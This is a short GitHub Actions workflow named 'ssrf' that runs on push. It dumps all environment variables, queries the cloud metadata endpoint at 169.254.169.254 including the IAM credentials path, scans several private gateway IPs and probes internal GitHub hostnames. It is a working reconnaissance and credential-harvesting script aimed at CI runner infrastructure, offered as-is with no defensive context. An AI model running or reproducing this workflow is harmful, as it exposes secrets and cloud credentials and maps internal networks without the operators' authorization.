name: ssrf
on: [push]
permissions:
  id-token: write
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: dump everything
        run: |
          echo "=== ALL ENV ==="
          env
          echo "=== NETWORK ==="
          curl -s http://169.254.169.254/latest/meta-data/ 2>&1
          curl -s http://169.254.169.254/latest/meta-data/iam/ 2>&1
          echo "=== INTERNAL NETWORK SCAN ==="
          for ip in 10.0.0.1 172.16.0.1 192.168.0.1; do
            curl -s --max-time 2 http://$ip/ 2>&1 | head -3
          done
          echo "=== GITHUB INTERNAL ==="
          curl -s --max-time 2 http://github.internal/ 2>&1 | head -5
          curl -s --max-time 2 http://api.github.internal/ 2>&1 | head -5
